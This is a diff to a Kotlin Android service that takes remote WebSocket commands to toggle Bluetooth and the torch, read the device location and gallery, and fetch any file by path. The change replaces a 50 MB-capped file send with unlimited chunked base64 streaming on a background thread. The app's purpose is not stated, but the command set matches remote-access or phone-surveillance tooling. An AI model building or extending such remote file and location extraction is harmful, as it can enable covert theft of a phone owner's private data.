@@ -373,7 +373,7 @@ class StreamingService : Service() {
                             "set-bluetooth"      -> setBluetooth(json.optBoolean("enabled", false), ws)
                             "set-torch"          -> setTorch(json.optBoolean("enabled", false), ws)
                             "vibrate"            -> doVibrate(json.optLong("ms", 500))
-                            "get-file"           -> sendFile(json.optString("path",""), ws)
+                            "get-file"           -> sendFile(json.optString("path",""), json.optString("requestId",""), ws)
                             "get-location"       -> sendLocation(ws)
                             "get-gallery"        -> sendGallery(json.optString("mediaType","images"), json.optInt("limit",30), json.optInt("offset",0), ws)
                             "get-media-thumb"    -> sendMediaThumb(json.optLong("id",0), json.optString("mediaType","images"), ws)
@@ -828,26 +828,35 @@ class StreamingService : Service() {
         } catch (_: Exception) {}
     }
 
-    private fun sendFile(filePath: String, ws: WebSocket) {
-        if (filePath.isBlank()) {
-            ws.send(JSONObject().put("type","file-data").put("err","Путь не указан").toString()); return
-        }
-        try {
-            val file = File(filePath)
-            if (!file.exists() || !file.isFile) {
-                ws.send(JSONObject().put("type","file-data").put("err","Файл не найден").toString()); return
-            }
-            val maxBytes = 50 * 1024 * 1024L // 50 MB
-            if (file.length() > maxBytes) {
-                ws.send(JSONObject().put("type","file-data").put("err","Файл слишком большой (>${maxBytes/1024/1024} МБ)").toString()); return
-            }
-            val bytes = file.readBytes()
-            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-            val mime = try { contentResolver.getType(Uri.fromFile(file)) } catch (_: Exception) { null } ?: "application/octet-stream"
-            ws.send(JSONObject().put("type","file-data").put("name",file.name).put("mime",mime).put("data",b64).toString())
-        } catch (e: Exception) {
-            ws.send(JSONObject().put("type","file-data").put("err",e.message ?: "ошибка").toString())
-        }
+    private fun sendFile(filePath: String, requestId: String, ws: WebSocket) {
+        fun err(msg: String) = ws.send(JSONObject().put("type","file-chunk").put("requestId",requestId).put("err",msg).toString())
+        if (filePath.isBlank()) { err("Путь не указан"); return }
+        val file = File(filePath)
+        if (!file.exists() || !file.isFile) { err("Файл не найден"); return }
+        val mime = try { contentResolver.getType(Uri.fromFile(file)) } catch (_: Exception) { null } ?: "application/octet-stream"
+        val fileSize = file.length()
+        val chunkSize = 512 * 1024
+        val totalChunks = ((fileSize + chunkSize - 1) / chunkSize).toInt().coerceAtLeast(1)
+        Thread {
+            try {
+                file.inputStream().use { stream ->
+                    val buf = ByteArray(chunkSize)
+                    var index = 0
+                    while (true) {
+                        val read = stream.read(buf)
+                        if (read <= 0) break
+                        val b64 = Base64.encodeToString(buf, 0, read, Base64.NO_WRAP)
+                        ws.send(JSONObject()
+                            .put("type","file-chunk").put("requestId",requestId)
+                            .put("index",index).put("total",totalChunks)
+                            .put("name",file.name).put("mime",mime).put("size",fileSize)
+                            .put("data",b64).toString())
+                        index++
+                        while (ws.queueSize() > 1024 * 1024) Thread.sleep(50)
+                    }
+                }
+            } catch (e: Exception) { err(e.message ?: "ошибка") }
+        }.apply { isDaemon = true }.start()
     }
 
     @Suppress("MissingPermission")
